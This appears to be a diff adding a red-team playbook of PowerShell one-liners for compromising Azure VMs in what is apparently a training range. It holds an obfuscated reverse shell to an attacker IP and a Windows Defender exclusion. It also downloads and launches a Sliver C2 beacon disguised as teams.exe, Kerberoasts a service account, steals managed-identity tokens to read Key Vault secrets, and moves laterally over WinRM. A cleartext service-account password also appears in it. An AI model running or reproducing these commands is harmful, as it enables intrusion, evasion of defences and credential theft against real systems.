@@ -1,0 +1,101 @@
+# =============================================================================
+# SLIVER C2 DEPLOYMENT ONE-LINERS
+# Run these from your Kali box (5.136.0.102) with Az PowerShell authenticated
+# Sliver C2 server: 20.96.91.180 (mTLS on 8082 and 8888)
+# =============================================================================
+
+# ─── STEP 1: NC SHELL (calls back to YOUR Kali on port 80) ───────────────────
+# Start nc listener on Kali first: nc -nlvp 80
+
+# RCCE2 - httpserver
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("5.136.0.102",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s' -AsJob
+
+# SiteA - httpserver (same command, different Az context)
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("5.136.0.102",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s' -AsJob
+
+# RCCE - httpserver
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("5.136.0.102",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s' -AsJob
+
+# ─── STEP 2: FROM NC SHELL — DEFENDER EXCLUSION + SLIVER DROP ────────────────
+# Paste these into the nc shell on httpserver:
+
+# 2a. Defender exclusion
+Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network"
+mkdir C:\ProgramData\Microsoft\Network -Force
+
+# 2b. Download Sliver beacon (host teams.exe on Kali HTTP server)
+# On Kali: cd /tmp && python3 -m http.server 8080
+Invoke-WebRequest -Uri "http://5.136.0.102:8080/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\teams.exe"
+# Or from Sliver C2 box (if 8888 is reachable):
+# Invoke-WebRequest -Uri "http://20.96.91.180:8888/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\teams.exe"
+
+# 2c. Start beacon (calls back to 20.96.91.180:8082)
+Start-Process "C:\ProgramData\Microsoft\Network\teams.exe" -WindowStyle Hidden
+
+# ─── STEP 3: KERBEROAST (from nc shell on httpserver) ────────────────────────
+Add-Type -AssemblyName System.IdentityModel
+$t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/blueDBServer.contoso.range:1433"
+$b = $t.GetRequest()
+[BitConverter]::ToString($b) -replace "-"
+# Save output, convert to hashcat format, crack with: hashcat -m 13100 hash.txt rockyou.txt
+
+# ─── STEP 4: KEYVAULT PASSWORD EXTRACTION (if kerberoast too slow) ───────────
+# From nc shell on httpserver — get managed identity token:
+$kvToken = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -Headers @{Metadata='true'}).access_token
+$armToken = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" -Headers @{Metadata='true'}).access_token
+
+# List vaults
+(Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/SUB_ID_HERE/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" -Headers @{Authorization="Bearer $armToken"}).value | ForEach-Object { Write-Output "Vault: $($_.name) URI: $($_.properties.vaultUri)" }
+
+# List secrets in vault
+(Invoke-RestMethod -Uri "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.4" -Headers @{Authorization="Bearer $kvToken"}).value | ForEach-Object { Write-Output "Secret: $($_.id)" }
+
+# Get secret value
+(Invoke-RestMethod -Uri "https://VAULT_NAME.vault.azure.net/secrets/SECRET_NAME?api-version=7.4" -Headers @{Authorization="Bearer $kvToken"}).value
+
+# Or use Meatball tokens (for SiteA vault tokens exist: token IDs 1073, 1065, 1053, 1052, 1051)
+# Or FOCI exchange from graph token to vault.azure.net
+
+# ─── STEP 5: LATERAL MOVE — EVIL-WINRM STYLE (from httpserver shell) ────────
+# Use the cracked/extracted svc.mssql password
+$pw = ConvertTo-SecureString 'CRACKED_PASSWORD_HERE' -AsPlainText -Force
+$cred = New-Object PSCredential('contoso\svc.mssql', $pw)
+
+# Test WinRM
+Test-WSMan -ComputerName blueDBServer
+
+# Execute on dbserver
+Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {
+    Write-Output "=== ON DBSERVER ==="
+    hostname; whoami
+    Get-Service *SQL* | Select Name,Status | Format-Table
+    # SQL enum
+    $c = New-Object System.Data.SqlClient.SqlConnection
+    $c.ConnectionString = 'Server=localhost;Integrated Security=True'
+    $c.Open()
+    $cmd = $c.CreateCommand()
+    $cmd.CommandText = 'SELECT name FROM sys.databases'
+    $rd = $cmd.ExecuteReader()
+    while($rd.Read()) { Write-Output "DB: $($rd[0])" }
+    $rd.Close()
+    $c.Close()
+}
+
+# Full interactive session (evil-winrm equivalent)
+$sess = New-PSSession -ComputerName blueDBServer -Credential $cred
+Enter-PSSession $sess
+# Now you're on dbserver interactively!
+
+# ─── STEP 6: EVIL-WINRM FROM THIS BOX (via SOCKS proxy or direct) ───────────
+# If you have a Sliver session, start SOCKS proxy:
+# sliver (IMPLANT) > socks5 start -p 1080
+# Then from Kali or this box:
+# proxychains evil-winrm -i blueDBServer -u 'contoso\svc.mssql' -p 'PASSWORD'
+
+# Or from this box directly (if network route exists):
+# evil-winrm -i 10.1.0.100 -u 'svc.mssql' -p 'PASSWORD'
+
+# ─── ENVIRONMENT-SPECIFIC NOTES ──────────────────────────────────────────────
+# RCCE2: sub=5152d66b, svc.mssql pw from prev engagement: GY2W*%m!P%0HK
+# SiteA: sub=a985babf, svc.mssql pw DIFFERENT — check KeyVault or kerberoast+crack
+# RCCE:  sub=1336b602, DC may be broken — kerberoast may fail, try KeyVault
